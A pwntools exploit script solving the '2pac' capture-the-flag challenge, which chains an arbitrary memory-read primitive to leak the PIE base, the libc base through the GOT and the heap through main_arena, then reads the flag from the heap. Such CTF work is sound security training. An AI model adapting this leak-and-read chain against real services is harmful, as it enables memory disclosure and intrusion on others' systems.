from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")

context.binary = exe

HOST = "2pac.challs.olicyber.it"
PORT = 21017

gdbscript = """
set follow-fork-mode child
"""

# args.LOCAL = True
args.DEBUG = True

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r, gdbscript=gdbscript)
    else:
        r = remote(HOST, PORT)

    return r

HEAP = 0
OFF = 0x480

def extract_ptr(ptr):
    return ptr & 0x7fffffffffff

def leak_pie_base(r):
    r.sendlineafter(b"> ", b"5")
    addr = int(r.recvuntil(b"Main").decode().split()[-2][2:], 16)

    exe.address = extract_ptr(addr) - exe.symbols.primality_test
    log.success(f"LEAKED PIE BASE: {hex(exe.address)}")

def leak_libc(r):
    r.sendlineafter(b"> ", b"3")
    r.sendlineafter(b"pointer: ", hex(exe.got.puts)[2:].encode())

    libc.address = int.from_bytes(r.recvline()[:8], "little") - libc.symbols.puts
    log.success(f"LEAKED LIBC: {hex(libc.address)}")

def leak_heap(r):
    r.sendlineafter(b"> ", b"3")
    r.sendlineafter(b"pointer: ", hex(libc.symbols.main_arena + 0x60)[2:].encode())

    global HEAP
    HEAP = int.from_bytes(r.recvline()[:8], "little") - 0x470
    log.success(f"LEAKED HEAP: {hex(HEAP)}")

def read_flag(r):
    i = 0
    flag = b""
    
    while True:
        r.sendlineafter(b"> ", b"3")
        r.sendlineafter(b"pointer: ", hex(HEAP + OFF + i)[2:].encode())
        flag += r.recvline()[:8]
        if b"}" in flag:
            break
        
        i += 8

    print(flag)
    
def main():
    r = conn()

    leak_pie_base(r)
    leak_libc(r)
    leak_heap(r)

    read_flag(r)    
    r.interactive()
    
if __name__ == "__main__":
    main()
